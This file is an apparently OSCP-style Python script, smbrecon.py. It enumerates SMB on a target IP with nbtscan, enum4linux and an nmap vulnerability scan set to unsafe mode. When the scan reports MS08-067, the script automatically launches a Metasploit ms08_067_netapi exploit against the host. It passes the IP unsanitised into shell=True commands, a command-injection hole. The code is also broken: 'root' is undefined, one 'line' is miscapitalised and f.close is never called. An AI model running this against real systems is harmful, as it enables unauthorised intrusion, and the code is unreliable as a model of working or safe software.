#!/usr/bin/python
import sys
import subprocess

def main(args):
    if len(args) != 2:
        print("Usage: smbrecon.py <ip address>")
        sys.exit(0)

    ip = args[1]
    NBTSCAN = "nbtscan -r %s" % (ip)
    nbtresults = subprocess.check_output(NBTSCAN, shell=True)
    if ("Connection refused" not in nbtresults) and ("Connect error" not in nbtresults) and ("Connection reset" not in nbtresults):
        print("[*] NBTSCAN User accounts/domains found on " + ip)
        print(nbtresults)
        resultsfile = root+"results/smb/" + ip + "_nbtscan.txt"
        f = open(resultsfile, "w")
        f.write(nbtresults)
        f.close

    NBTSCAN = "enum4linux -a %s" % (ip)
    nbtresults = subprocess.check_output(NBTSCAN, shell=True)
    if ("Connection refused" not in nbtresults) and ("Connect error" not in nbtresults) and ("Connection reset" not in nbtresults):
        print("[*] ENUM4LINUX User accounts/domains found on " + ip)
        print(nbtresults)
        resultsfile = root+"results/smb/" + ip + "_enum4linux.txt"
        f = open(resultsfile, "w")
        f.write(nbtresults)
        f.close

    NBTSCAN = "nmap -vv -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 %s -oA %sresults/smb/%s_smbnse" % (ip,root, ip)
    nbtresults = subprocess.check_output(NBTSCAN, shell=True)
    lines = nbtresults.split("\n")
    for line in lines:
        if "VULNERABLE" in line:
            print('FOUND SMB VULN on ' +ip+ ": " +line)
        if "MS08-067:" in Line and "Vulnerable" in line and "NOT" not in line:
            print("Exploiting MS08-067")
            cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
            subprocess.call(cmd.split(" "))

if __name__=='__main__':
    main(sys.argv)



